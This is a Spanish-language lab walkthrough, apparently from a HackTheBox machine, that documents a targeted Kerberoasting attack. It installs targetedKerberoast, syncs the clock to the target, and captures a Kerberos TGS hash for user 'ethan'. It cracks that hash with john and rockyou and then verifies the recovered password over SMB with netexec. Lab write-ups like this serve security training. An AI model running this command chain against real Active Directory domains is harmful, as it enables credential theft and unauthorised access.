#targetedKerberoast.py

----

Es un **script de Impacket** diseñado para realizar un ataque de **Kerberoasting** de forma **selectiva (targeted)** contra cuentas de servicio en entornos **Active Directory**.

-----
# Instalacion

Vamos a descargar el repositorio con [[git clone]] usando `git clone https://github.com/ShutdownRepo/targetedKerberoast` despues entramos con [[cd]] usando `cd targetedKerberoast`. Instalamos los requierements con `pip3 install -r requirements.txt` 

![[Administrator44.png]]

----

# Cambiar hora al horario de la maquina victima con [[ntpdate]]
Intente ejecutar  el script pero tuve este error, ya que (Clock skew too great) es por que para kerberos tengo que tener la misma hora que la maquina

![[Administrator46.png]]

Usamos [[ntpdate]] para cambiar la hora con el comando `ntpdate 10.129.112.167`

![[Administrator45.png]]

------
# Comando

```shell
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'Usuario' -p 'Contraseña'
Ejemplo python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

*Parametros:*
	`-v` Verbose para mos trar todo detallado
	`-d` Nombre del dominio
	`-u` Usuario
	`-p` Contraseña


![[Administrator48.png]]

Nos da todo este hash

```shell
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$23eb1fa79ea86f23efa08c4660349a97$a4b92ea1db424dad585c34d1f7bdc2065d1a9981e350e87b498afbe3dd7699e805b50bb39acb55dc81a13d96e5a70f70019b1a90958bb1cc5f43e82aae7d4c753d26be8bec4b479a4dda3d9809d7a627ff6c69310ee5c80069d34c65fcb54ec017a4ff50c14b894f48efa63b3af2193b2c1e859916d300f9debb232147051a63b2fa472f304044dece335996678806c803d1ac4e36e974074bbac499b6a7b6ba2887d97339aa1fa9843b26483b5472f71ed513c4ba13ff09785f2f2b29e058d4111ed4ff48e281771609e60929c4a2b5f4762178d71a770eb68d293a8d0a036bda9883977e9190f254b51bb7163f1f805bc4ac99b6f4c5e77ca119c4877b26cbe767d2020ae5e361550b5288ab159666ae281da0b7cd825390298f2d51361a79fb37cb876d37c4c14b6f8ab83cfb04a31e95200fcd722281e2a7b69417ea8a4a8dbba037812a3decfceffce970fd58dc499a7cabfaf13c168e24e662ffb6bb253e22cf22f665cbe6d83ad8c9f3054c77447bbf2d8e4fb3284dd6c1029922853948c0c49c9f97fdda9c52153873fed8c9981ca2423a722f8c6b352b3c5a4f46eb4723ddcf082543d354b100d701223a6144279f34bee85a66e9edae4b5105dcbedd33e01c6a7d248b3a5f5b4c1ae101c5002a088209c1b7fbe1d4b5380b073fa322610c60e5578b5a7a676a39e917c3c58a4e5efd2e76e28a3e04e97c8d974d072ae56817ea3281af08c57cb1a9910e7aa824deaf4a2df36bfcb0826fd825a8ba79ff51829c75a8ff4f07869155abb11be4cb86838a4ec07514f15b6ef1350d1c5cba88bd545ce339ef0747f886d090175e49564e77ee5d30c10d37a72c1dc65acae478ddd7e2faf84f6b652abbfd9759396ac0dc8507ee527d4952d3cfdde1d3ed39758d1b269f63fa9b37d9407ef854b4a1d6746c9c0dc0e55db1ce5c38993106a018aa94c26a505fc2bf21a0e90a98572e0e0ce9f8fc17c12a108bcb3f014e8318eeeb113e8d623122407b2e0d37b158e42be3c50680660b4533a43ae86be13cce1093cacdfaa73d39b3bc50f6b0fa39859e6b911a801d2800ff5ee152b7422b6cb5fec85dd4e7e518d45f2769447c8000d424f64cf887ab42748aa607eceb48bafd1dbd65fc0d50ca28fff1d70c281d3e8ced3f9c400a93fa3138c3455ee573b6b86941d92e1081f7dc50556ca2d5b92be543db39d3c78e35f37a58b9f4ecd265435070b9b3aa66318e89b505c5182a9e560d08091a6f7b1cbf3f1839c2c99b6bc2fc57a2152d19576d9a31155a05634daed291c187001ed2c816e9d444e35a8e993c75bac681d4a265d2f89f676865916d51c5695853b035c0cdf832b11ddabc3d02249abfbb9e219cd81cf52747aec02644f04ab74f83ff3e9c13985efb2fdfd46981456a90e1f0f92e38517310a6ff91ac6a8f2183bb73c087250e971aef0be940f1463caad4c6970f33c03fa4d956e914f95ede8d4b16febb7b3951a93cc2b4e66712d997105999b1aa50f6c0e65c546a3ec850367700ae6d19650f
```

Que lo voy a poner en un archivo llamado *ethan.txt* usando [[nvim]] con el comando `nvim ethan.txt` y pegando todo su contenido en el editor de texto

![[Administrator49.png]]
Ahora con [[john]] vamos crackear la contraseña usando el comando `john ethan.txt -w=/usr/share/wordlists/rockyou.txt`
Nos da la contraseña limpbizkit
Asi que tenemos las credenciales ethan:limpbizkit

Con `netexec smb 10.129.112.167 -u ethan -p 'limpbizkit' --shares` confirmamos que la contraseña es correcta